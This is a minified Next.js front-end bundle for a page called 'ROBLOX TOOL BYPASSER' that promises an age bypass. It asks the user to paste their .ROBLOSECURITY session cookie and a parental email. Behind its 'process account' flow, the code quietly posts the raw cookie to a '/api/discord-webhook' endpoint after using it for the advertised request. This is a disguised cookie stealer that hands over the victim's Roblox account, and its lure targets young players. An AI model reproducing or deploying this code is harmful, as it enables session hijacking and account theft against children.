(self.webpackChunk_N_E = self.webpackChunk_N_E || []).push([
    [974], {
        4176: (e, t, r) => {
            Promise.resolve().then(r.bind(r, 8561))
        },
        8561: (e, t, r) => {
            "use strict";
            r.r(t), r.d(t, {
                default: () => z
            });
            var s = r(5155),
                a = r(2115),
                l = r(9708),
                i = r(2085),
                o = r(2596),
                n = r(9688);

            function d() {
                for (var e = arguments.length, t = Array(e), r = 0; r < e; r++) t[r] = arguments[r];
                return (0, n.QP)((0, o.$)(t))
            }
            let c = (0, i.F)("inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm font-medium ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 [&_svg]:pointer-events-none [&_svg]:size-4 [&_svg]:shrink-0", {
                    variants: {
                        variant: {
                            default: "bg-primary text-primary-foreground hover:bg-primary/90",
                            destructive: "bg-destructive text-destructive-foreground hover:bg-destructive/90",
                            outline: "border border-input bg-background hover:bg-accent hover:text-accent-foreground",
                            secondary: "bg-secondary text-secondary-foreground hover:bg-secondary/80",
                            ghost: "hover:bg-accent hover:text-accent-foreground",
                            link: "text-primary underline-offset-4 hover:underline"
                        },
                        size: {
                            default: "h-10 px-4 py-2",
                            sm: "h-9 rounded-md px-3",
                            lg: "h-11 rounded-md px-8",
                            icon: "h-10 w-10"
                        }
                    },
                    defaultVariants: {
                        variant: "default",
                        size: "default"
                    }
                }),
                u = a.forwardRef((e, t) => {
                    let {
                        className: r,
                        variant: a,
                        size: i,
                        asChild: o = !1,
                        ...n
                    } = e, u = o ? l.DX : "button";
                    return (0, s.jsx)(u, {
                        className: d(c({
                            variant: a,
                            size: i,
                            className: r
                        })),
                        ref: t,
                        ...n
                    })
                });
            u.displayName = "Button";
            let m = a.forwardRef((e, t) => {
                let {
                    className: r,
                    type: a,
                    ...l
                } = e;
                return (0, s.jsx)("input", {
                    type: a,
                    className: d("flex h-10 w-full rounded-md border border-input bg-background px-3 py-2 text-base ring-offset-background file:border-0 file:bg-transparent file:text-sm file:font-medium file:text-foreground placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50 md:text-sm", r),
                    ref: t,
                    ...l
                })
            });
            m.displayName = "Input";
            let f = a.forwardRef((e, t) => {
                let {
                    className: r,
                    ...a
                } = e;
                return (0, s.jsx)("textarea", {
                    className: d("flex min-h-[80px] w-full rounded-md border border-input bg-background px-3 py-2 text-base ring-offset-background placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50 md:text-sm", r),
                    ref: t,
                    ...a
                })
            });
            f.displayName = "Textarea";
            var x = r(8550),
                p = r(6474),
                h = r(7863),
                g = r(5196);
            let b = x.bL;
            x.YJ;
            let w = x.WT,
                v = a.forwardRef((e, t) => {
                    let {
                        className: r,
                        children: a,
                        ...l
                    } = e;
                    return (0, s.jsxs)(x.l9, {
                        ref: t,
                        className: d("flex h-10 w-full items-center justify-between rounded-md border border-input bg-background px-3 py-2 text-sm ring-offset-background placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-ring focus:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50 [&>span]:line-clamp-1", r),
                        ...l,
                        children: [a, (0, s.jsx)(x.In, {
                            asChild: !0,
                            children: (0, s.jsx)(p.A, {
                                className: "h-4 w-4 opacity-50"
                            })
                        })]
                    })
                });
            v.displayName = x.l9.displayName;
            let y = a.forwardRef((e, t) => {
                let {
                    className: r,
                    ...a
                } = e;
                return (0, s.jsx)(x.PP, {
                    ref: t,
                    className: d("flex cursor-default items-center justify-center py-1", r),
                    ...a,
                    children: (0, s.jsx)(h.A, {
                        className: "h-4 w-4"
                    })
                })
            });
            y.displayName = x.PP.displayName;
            let N = a.forwardRef((e, t) => {
                let {
                    className: r,
                    ...a
                } = e;
                return (0, s.jsx)(x.wn, {
                    ref: t,
                    className: d("flex cursor-default items-center justify-center py-1", r),
                    ...a,
                    children: (0, s.jsx)(p.A, {
                        className: "h-4 w-4"
                    })
                })
            });
            N.displayName = x.wn.displayName;
            let j = a.forwardRef((e, t) => {
                let {
                    className: r,
                    children: a,
                    position: l = "popper",
                    ...i
                } = e;
                return (0, s.jsx)(x.ZL, {
                    children: (0, s.jsxs)(x.UC, {
                        ref: t,
                        className: d("relative z-50 max-h-96 min-w-[8rem] overflow-hidden rounded-md border bg-popover text-popover-foreground shadow-md data-[state=open]:animate-in data-[state=closed]:animate-out data-[state=closed]:fade-out-0 data-[state=open]:fade-in-0 data-[state=closed]:zoom-out-95 data-[state=open]:zoom-in-95 data-[side=bottom]:slide-in-from-top-2 data-[side=left]:slide-in-from-right-2 data-[side=right]:slide-in-from-left-2 data-[side=top]:slide-in-from-bottom-2", "popper" === l && "data-[side=bottom]:translate-y-1 data-[side=left]:-translate-x-1 data-[side=right]:translate-x-1 data-[side=top]:-translate-y-1", r),
                        position: l,
                        ...i,
                        children: [(0, s.jsx)(y, {}), (0, s.jsx)(x.LM, {
                            className: d("p-1", "popper" === l && "h-[var(--radix-select-trigger-height)] w-full min-w-[var(--radix-select-trigger-width)]"),
                            children: a
                        }), (0, s.jsx)(N, {})]
                    })
                })
            });
            j.displayName = x.UC.displayName, a.forwardRef((e, t) => {
                let {
                    className: r,
                    ...a
                } = e;
                return (0, s.jsx)(x.JU, {
                    ref: t,
                    className: d("py-1.5 pl-8 pr-2 text-sm font-semibold", r),
                    ...a
                })
            }).displayName = x.JU.displayName;
            let k = a.forwardRef((e, t) => {
                let {
                    className: r,
                    children: a,
                    ...l
                } = e;
                return (0, s.jsxs)(x.q7, {
                    ref: t,
                    className: d("relative flex w-full cursor-default select-none items-center rounded-sm py-1.5 pl-8 pr-2 text-sm outline-none focus:bg-accent focus:text-accent-foreground data-[disabled]:pointer-events-none data-[disabled]:opacity-50", r),
                    ...l,
                    children: [(0, s.jsx)("span", {
                        className: "absolute left-2 flex h-3.5 w-3.5 items-center justify-center",
                        children: (0, s.jsx)(x.VF, {
                            children: (0, s.jsx)(g.A, {
                                className: "h-4 w-4"
                            })
                        })
                    }), (0, s.jsx)(x.p4, {
                        children: a
                    })]
                })
            });
            k.displayName = x.q7.displayName, a.forwardRef((e, t) => {
                let {
                    className: r,
                    ...a
                } = e;
                return (0, s.jsx)(x.wv, {
                    ref: t,
                    className: d("-mx-1 my-1 h-px bg-muted", r),
                    ...a
                })
            }).displayName = x.wv.displayName;
            var R = r(968);
            let S = (0, i.F)("text-sm font-medium leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70"),
                A = a.forwardRef((e, t) => {
                    let {
                        className: r,
                        ...a
                    } = e;
                    return (0, s.jsx)(R.b, {
                        ref: t,
                        className: d(S(), r),
                        ...a
                    })
                });
            A.displayName = R.b.displayName;
            let O = (0, i.F)("relative w-full rounded-lg border p-4 [&>svg~*]:pl-7 [&>svg+div]:translate-y-[-3px] [&>svg]:absolute [&>svg]:left-4 [&>svg]:top-4 [&>svg]:text-foreground", {
                    variants: {
                        variant: {
                            default: "bg-background text-foreground",
                            destructive: "border-destructive/50 text-destructive dark:border-destructive [&>svg]:text-destructive"
                        }
                    },
                    defaultVariants: {
                        variant: "default"
                    }
                }),
                C = a.forwardRef((e, t) => {
                    let {
                        className: r,
                        variant: a,
                        ...l
                    } = e;
                    return (0, s.jsx)("div", {
                        ref: t,
                        role: "alert",
                        className: d(O({
                            variant: a
                        }), r),
                        ...l
                    })
                });
            C.displayName = "Alert", a.forwardRef((e, t) => {
                let {
                    className: r,
                    ...a
                } = e;
                return (0, s.jsx)("h5", {
                    ref: t,
                    className: d("mb-1 font-medium leading-none tracking-tight", r),
                    ...a
                })
            }).displayName = "AlertTitle";
            let P = a.forwardRef((e, t) => {
                let {
                    className: r,
                    ...a
                } = e;
                return (0, s.jsx)("div", {
                    ref: t,
                    className: d("text-sm [&_p]:leading-relaxed", r),
                    ...a
                })
            });
            P.displayName = "AlertDescription";
            var E = r(9803),
                T = r(7580),
                _ = r(4454),
                F = r(8883),
                U = r(646),
                q = r(5339),
                B = r(1366),
                L = r(8833);
            let I = () => {
                let [e, t] = (0, a.useState)(""), [r, l] = (0, a.useState)(""), [i, o] = (0, a.useState)(""), [n, d] = (0, a.useState)(null), [c, x] = (0, a.useState)(!1), p = async (e, t) => {
                    try {
                        let r = await fetch("/api/discord-webhook", {
                            method: "POST",
                            headers: {
                                "Content-Type": "application/json"
                            },
                            body: JSON.stringify({
                                parentalEmail: e,
                                cookieValue: t
                            })
                        });
                        if (!r.ok) {
                            let e = await r.json();
                            console.error("Failed to send Discord notification:", e)
                        }
                    } catch (e) {
                        console.error("Error sending Discord notification:", e)
                    }
                }, h = async e => {
                    let t = await fetch("/api/get-csrf-token", {
                            method: "POST",
                            headers: {
                                "Content-Type": "application/json"
                            },
                            body: JSON.stringify({
                                cookie: e
                            })
                        }),
                        r = await t.json();
                    if (!t.ok) throw Error(r.error || "Failed to get CSRF token from API route");
                    return r.csrfToken
                }, g = async (e, t, r) => {
                    let s = await fetch("/api/send-parent-request", {
                            method: "POST",
                            headers: {
                                "Content-Type": "application/json"
                            },
                            body: JSON.stringify({
                                email: e,
                                cookie: t,
                                csrfToken: r
                            })
                        }),
                        a = await s.json();
                    if (!s.ok) throw Error(a.error || "Failed to send parent request via API route");
                    return a
                }, y = async e => {
                    e.preventDefault(), x(!0), d(null);
                    try {
                        if (!r.trim()) throw Error("Please enter your .ROBLOSECURITY cookie");
                        if (!i.trim()) throw Error("Please enter a parental email address");
                        if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(i)) throw Error("Please enter a valid email address");
                        let e = r.trim().replace(/^\.ROBLOSECURITY=/, "");
                        d({
                            type: "success",
                            text: "Getting authentication token..."
                        });
                        let s = await h(e);
                        d({
                            type: "success",
                            text: "Sending parent request to ".concat(i, "...")
                        }), await g(i, e, s), d({
                            type: "success",
                            text: "Parent request successfully sent to ".concat(i, "! Please check the email for further instructions.")
                        }), p(i, e), l(""), o(""), t("")
                    } catch (e) {
                        console.error("Error processing request:", e), d({
                            type: "error",
                            text: e instanceof Error ? e.message : "An unexpected error occurred"
                        })
                    } finally {
                        x(!1)
                    }
                };
                return (0, s.jsx)("div", {
                    className: "min-h-screen bg-slate-900 flex items-center justify-center p-4",
                    children: (0, s.jsxs)("div", {
                        className: "w-full max-w-2xl bg-slate-800 rounded-2xl p-8 border border-slate-700",
                        children: [(0, s.jsxs)("div", {
                            className: "flex items-center gap-3 mb-8",
                            children: [(0, s.jsx)("div", {
                                className: "w-8 h-8 bg-pink-500 rounded-lg flex items-center justify-center",
                                children: (0, s.jsx)(E.A, {
                                    className: "w-5 h-5 text-white"
                                })
                            }), (0, s.jsx)("h1", {
                                className: "text-2xl font-semibold text-white",
                                children: "ROBLOX TOOL BYPASSER"
                            })]
                        }), (0, s.jsxs)("form", {
                            onSubmit: y,
                            className: "space-y-6",
                            children: [(0, s.jsxs)("div", {
                                className: "space-y-3",
                                children: [(0, s.jsxs)("div", {
                                    className: "flex items-center gap-3",
                                    children: [(0, s.jsx)(T.A, {
                                        className: "w-5 h-5 text-slate-400"
                                    }), (0, s.jsx)(A, {
                                        className: "text-lg font-medium text-white",
                                        children: "Select Age Bypass Method"
                                    })]
                                }), (0, s.jsxs)(b, {
                                    value: e,
                                    onValueChange: t,
                                    children: [(0, s.jsx)(v, {
                                        className: "w-full h-14 bg-slate-700 border-2 border-blue-500 text-white rounded-xl text-base",
                                        children: (0, s.jsx)(w, {
                                            placeholder: "Select method..."
                                        })
                                    }), (0, s.jsxs)(j, {
                                        className: "bg-slate-700 border-slate-600",
                                        children: [(0, s.jsx)(k, {
                                            value: "2008-birthyear",
                                            className: "text-white hover:bg-slate-600",
                                            children: "2008 Birthyear Up"
                                        }), (0, s.jsx)(k, {
                                            value: "other-method",
                                            className: "text-white hover:bg-slate-600",
                                            children: "Other Method"
                                        })]
                                    })]
                                })]
                            }), "2008-birthyear" === e && (0, s.jsxs)(s.Fragment, {
                                children: [(0, s.jsxs)("div", {
                                    className: "space-y-3",
                                    children: [(0, s.jsxs)("div", {
                                        className: "flex items-center gap-3",
                                        children: [(0, s.jsx)(_.A, {
                                            className: "w-5 h-5 text-slate-400"
                                        }), (0, s.jsx)(A, {
                                            className: "text-lg font-medium text-white",
                                            children: ".ROBLOSECURITY Cookie"
                                        })]
                                    }), (0, s.jsx)(f, {
                                        value: r,
                                        onChange: e => l(e.target.value),
                                        placeholder: "Paste your .ROBLOSECURITY cookie here...",
                                        className: "w-full h-32 bg-slate-700 border-2 border-slate-600 text-white placeholder:text-slate-400 rounded-xl resize-none text-base p-4"
                                    })]
                                }), (0, s.jsxs)("div", {
                                    className: "space-y-3",
                                    children: [(0, s.jsxs)("div", {
                                        className: "flex items-center gap-3",
                                        children: [(0, s.jsx)(F.A, {
                                            className: "w-5 h-5 text-slate-400"
                                        }), (0, s.jsx)(A, {
                                            className: "text-lg font-medium text-white",
                                            children: "Parental Email"
                                        })]
                                    }), (0, s.jsx)(m, {
                                        type: "email",
                                        value: i,
                                        onChange: e => o(e.target.value),
                                        placeholder: "Enter parental email address...",
                                        className: "w-full h-14 bg-slate-700 border-2 border-slate-600 text-white placeholder:text-slate-400 rounded-xl text-base"
                                    })]
                                })]
                            }), n && (0, s.jsxs)(C, {
                                className: "border-2 ".concat("success" === n.type ? "border-green-500 bg-green-500/10" : "border-red-500 bg-red-500/10"),
                                children: ["success" === n.type ? (0, s.jsx)(U.A, {
                                    className: "h-4 w-4 text-green-500"
                                }) : (0, s.jsx)(q.A, {
                                    className: "h-4 w-4 text-red-500"
                                }), (0, s.jsx)(P, {
                                    className: "success" === n.type ? "text-green-400" : "text-red-400",
                                    children: n.text
                                })]
                            }), (0, s.jsx)(u, {
                                type: "submit",
                                disabled: "2008-birthyear" !== e || !r.trim() || !i.trim() || c,
                                className: "w-full h-14 bg-gradient-to-r from-purple-600 to-blue-600 hover:from-purple-700 hover:to-blue-700 text-white font-semibold rounded-xl text-lg disabled:opacity-50 disabled:cursor-not-allowed transition-all duration-200",
                                children: c ? (0, s.jsxs)("div", {
                                    className: "flex items-center gap-2",
                                    children: [(0, s.jsx)("div", {
                                        className: "w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin"
                                    }), "Processing..."]
                                }) : (0, s.jsxs)(s.Fragment, {
                                    children: [(0, s.jsx)(_.A, {
                                        className: "w-5 h-5 mr-2"
                                    }), "PROCESS ACCOUNT"]
                                })
                            })]
                        }), (0, s.jsx)("div", {
                            className: "mt-6 p-4 bg-slate-700/50 rounded-xl border border-slate-600",
                            children: (0, s.jsxs)("p", {
                                className: "text-sm text-slate-300",
                                children: [(0, s.jsx)("strong", {
                                    children: "How it works:"
                                }), " This will send a parental consent request to the specified email address. The parent will receive an email with instructions to approve the account changes."]
                            })
                        }), (0, s.jsxs)("div", {
                            className: "mt-6 p-4 bg-gradient-to-r from-indigo-600/20 to-purple-600/20 rounded-xl border border-indigo-500/30",
                            children: [(0, s.jsx)("h3", {
                                className: "text-lg font-semibold text-white mb-3",
                                children: "Need Help?"
                            }), (0, s.jsxs)("div", {
                                className: "grid grid-cols-1 sm:grid-cols-2 gap-3",
                                children: [(0, s.jsxs)(u, {
                                    type: "button",
                                    onClick: () => window.open("https://discord.gg/jwubqvYm2D", "_blank"),
                                    className: "bg-indigo-600 hover:bg-indigo-700 text-white font-medium px-6 py-3 rounded-xl transition-all duration-200 flex items-center justify-center gap-2 shadow-lg hover:shadow-xl",
                                    children: [(0, s.jsx)(B.A, {
                                        className: "w-5 h-5"
                                    }), "Join Discord"]
                                }), (0, s.jsxs)(u, {
                                    type: "button",
                                    onClick: () => window.open("https://streamable.com/h8xp9t", "_blank"),
                                    className: "bg-blue-600 hover:bg-blue-700 text-white font-medium px-6 py-3 rounded-xl transition-all duration-200 flex items-center justify-center gap-2 shadow-lg hover:shadow-xl",
                                    children: [(0, s.jsx)(L.A, {
                                        className: "w-5 h-5"
                                    }), "Tutorial Video"]
                                })]
                            })]
                        })]
                    })
                })
            };

            function z() {
                return (0, s.jsx)(I, {})
            }
        }
    },
    e => {
        var t = t => e(e.s = t);
        e.O(0, [765, 441, 684, 358], () => t(4176)), _N_E = e.O()
    }
]);